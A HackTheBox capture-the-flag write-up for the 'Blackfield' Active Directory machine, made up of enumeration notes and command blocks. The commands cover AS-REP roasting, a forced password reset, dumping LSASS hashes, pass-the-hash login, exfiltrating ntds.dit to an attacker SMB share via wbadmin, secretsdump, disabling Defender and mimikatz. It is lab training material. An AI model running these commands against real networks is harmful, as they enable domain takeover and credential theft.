<p align="center">
  <img src="https://github.com/cyberwr3nch/hackthebox/blob/master/writeups/assets/Blackfield.jpg" alt='HTB_logo'>
</p>


### Description:

This machine...

### Difficulty:

`easy`


#### Enumeration

- Open ports `53 (DNS),88 (Kerberos), 135 (msrpc), 389 (LDAP), 445 (SMB), 593, 3268 (Secure LDAP)`
- With the ports open its concluded that its an ActiveDirectory 
- Starting tests for ActiveDirectory `rpcclinet, smbshares, `
- `enumdomusers` in the rpcclinet enumerates the available user
- Enumerating the `smb shares` with crackmapexec
- `profiles$` share is accessable by the anonymous user, thus mounting it to the local machine and looking at the files its just user names
- Gathering the usernames and enumerating the ActiveDirectory users with `kerbrute`
- 3 ad users enumerated, `audit, support, svc_backup`
- Check for `Kerberos-pre-auth` with `GetNPUsers.py` from `impackets`
- Obtain the `asrep` token for the `support` user
- Crack the asrep token, obtained password: `#00^BlackKnight`
- Enumerate `rpc` with `rpcclinet`
- Checking for `Kerberos-pre-auth` enabled for the newly enabled users
- Running bloodhound to obtain information
- Mark the `support` user as `owned`
- Mark the users `svc_backup` and `audit2020` as `high valuable`
- Shortest path from here to  owned reveals `Force Password Change`
- Change the users password with `rpcclinet` 
- After changing the password for the `audit2020` user, the `forencics` smb share is accessable
- A zip file `lsass.zip` was found in `memory_analysis` dir
- lsass is the place where `mimikatz` obtains password
- `pypykatz` is used to analyze `lsass` file in linux
- The `NT` hashes for the user `Administrator` and `svc_backup` can be found
- The Administrator's hash cannot be validated to SMB shares
- Logginig into the `svc_backup` with the `evil-winrm` with the `hash` obtained form the `lsass.dmp` file
- After logging in as `svc_backup` and looking at the priviledges available for the user `SeBackupPriviledge` and `SeRestorePriviledge` are enabled which is a seriously danger priviledges
- Start the smb server in the kali machine and share the data via `wbadmin`
- Backup fails, since it needs to be backuped in the `ntfs` disk format
- Create a `ntfs disk` in the linux
- Extract the information from the ntds.dit via wbadmin
- Obtain the system hive via registry



#### Commands:

```bash
# smb shares Enumeration
smbclient -L 10.10.10.192 -U 'wr3nch'

# crackmapexec
crackmapexec smb 10.10.10.192 --shares -u 'wr3nch' -p ''
```

```bash
# access an available smb share
smbclient '//10.10.10.192/profiles$'

# mounting a smb share
mount -t cifs '//10.10.10.192/profiles$' /mnt/
```

```bash
# user name enumeration with kerbrute
kerbrute userenum --dc 10.10.10.192 -d blackfield users.txt
```

```bash
# check for Kerberos pre auth enabled
GetNPUsers.py -dc-ip 10.10.10.192 -no-pass -usersfile users.txt 10.10.10.192/
```

```bash
# mount an authenticated shares
mount -t cifs -o 'username=support,password=#00^BlackKnight' '//10.10.10.192/profiles$' /mnt
```

```bash
# rpcclient testing
rpcclient 10.10.10.192 -U support 

# enumerate users 
enumdomusers
```

```bash
# bloodhound.py installation
git clone https://github.com/fox-it/BloodHound.py
cd BloodHound.py
python3 setup.py install

# running bloodhound.py
python3 bloodhound.py -u support -p '#00^BlackKnight' -ns 10.10.10.192 -d blackfield.local -c all 

# now everything will be obtained in a json file 

# start the neo4j console
sudo ne04j console

# start the bloodhound
cd /opt/bloodhound-linux-x64/
./BloodHound

# import all the json files
```

```bash
# change the users password via rpcclient
# logging in to rpcclient
rpcclinet -U support 10.10.10.192
# password #00^BlackKnight

rpcclinet $> setuserinfo2 audit2020 23 'Password'
```

```bash
# pypykatz installation
pip3 install pypykatz

# analyze the lsass dump with pypykatz
pypykatz lsa minidump lsass.DMP
```

```bash
# login with evil-winrm
evil-winrm -i 10.10.10.192 -u svc_backup -H {hash}
```

```bash
# look for the priviledges available for the current user in the PowerShell

whoami /all
whoami /priv
```

```bash
# start the smb service
# syntax: sudo smbserver.py -smb2support {shareName} {path} -user {username} -p {password}
sudo smbserver.py -smb2support -user ippsec -p PleaseSubscribe smbShare ~/htb/blackfield/smb

# share data via wbadmin in the PowerShell instance
echo y | wbadmin start backup -backuptarget:\\10.10.14.2\smbShare -include:c:\windows\ntds\

# access the smb share with net
# syntax: net use {shareVolumeName} \\{ip}\{sharename} /user:{userName} {password}
net use x: \\10.10.14.2\smbShare /user:ippsec PleaseSubscribe
# after connecting traverse to the shared directory
x: 
# delete the mounted share
net use x: /delete
```

```bash
# create a ntfs disk format in linux with 2 GiGs of storage
dd if=/dev/zero of=ntfs.disk bs=1024M count=2

# mount the disk with losetup
sudo losetup -fP ntfs.disk 
losetup -a 
sudo mkfs.ntfs /dev/loop0
sudo mount /dev/loop0 smb/
```

```bash
# PowerShell commands
# extract information from the ntds.dit via wbadmin
echo y | wbadmin start recovery -verison:{versionNumber} -itemtype:file -items:C:\Windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
# obtain the version number of the backup
wbadmin get versions
```

```bash
# obtain system hive from the registry
# syntax: reg save hklm\system {path}
reg save hklm\system system.hive

# obtain account infos with ntds.dit and system.hive
secretsdump.py -ntds ntds.dit -system system.hive LOCAL 
# obtain the history of password changes
secretsdump.py -ntds ntds.dit -system system.hive -history LOCAL 
```

```bash
# disable the antivirus in the windows machine
cd 'C:\Progra~1\WindowsDefender\'
.\mpcmdrun.exe -RemoveDefinitions -All


# upload mimikatz and resotre the ntml of the audit2020
.\mimikatz.exe 	"lsadump::setntlm /user:audit2020 /ntlm:{hash_obtained_from_history}"